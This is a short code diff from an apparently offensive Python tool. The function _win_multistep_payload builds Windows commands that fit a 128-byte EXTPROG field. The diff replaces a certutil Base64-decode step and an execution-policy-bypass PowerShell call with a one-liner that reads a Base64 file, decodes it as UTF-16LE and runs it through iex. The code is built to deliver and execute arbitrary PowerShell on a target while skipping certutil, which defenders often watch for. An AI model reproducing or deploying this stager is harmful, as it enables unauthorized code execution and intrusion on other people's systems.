@@ -396,13 +396,12 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
             "params": "",
         })
 
-    # Decode Base64 to UTF-16LE .ps1 via certutil, then execute.
-    # certutil + powershell -f both fit easily in 128-byte EXTPROG.
-    steps.append({
-        "command": f"certutil -decode {tmp} {tmp}.ps1",
-        "params": "",
-    })
-    run_cmd = f"powershell -nop -ep bypass -f {tmp}.ps1"
+    # Read Base64 file with gc (Get-Content), join lines, decode
+    # UTF-16LE and execute. No -Raw (PS v2 compat), no certutil.
+    # gc reads lines, -join'' concatenates, then decode+exec.
+    run_cmd = (f"powershell -nop -c \"$b=(gc '{tmp}')-join'';"
+               f"iex([Text.Encoding]::Unicode.GetString("
+               f"[Convert]::FromBase64String($b)))\"")
     assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
     return {
         "steps": steps,
